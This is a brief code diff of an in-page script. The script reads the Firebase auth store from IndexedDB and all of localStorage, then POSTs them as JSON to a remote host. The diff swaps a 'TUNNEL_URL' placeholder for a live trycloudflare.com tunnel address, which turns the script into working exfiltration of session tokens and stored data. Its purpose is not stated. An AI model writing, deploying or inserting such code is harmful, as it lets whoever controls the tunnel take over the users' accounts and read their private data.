@@ -3,7 +3,7 @@
 var db=await new Promise(function(res,rej){var r=indexedDB.open('firebaseLocalStorageDb');r.onsuccess=function(){res(r.result)};r.onerror=function(){rej(r.error)}});
 var items=await new Promise(function(res,rej){var t=db.transaction('firebaseLocalStorage','readonly').objectStore('firebaseLocalStorage').getAll();t.onsuccess=function(){res(t.result)};t.onerror=function(){rej(t.error)}});
 var ls={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);ls[k]=localStorage.getItem(k)}
-var r=await fetch('TUNNEL_URL/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nonce:location.hash.slice(1),data:{idb:items,ls:ls}})});
+var r=await fetch('https://concrete-engineering-perception-parent.trycloudflare.com/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nonce:location.hash.slice(1),data:{idb:items,ls:ls}})});
 s.textContent=r.ok?('Done: '+items.length+' item(s) handed over.'):'Refused';
 }catch(e){s.textContent='Failed: '+e}})();
 </script>
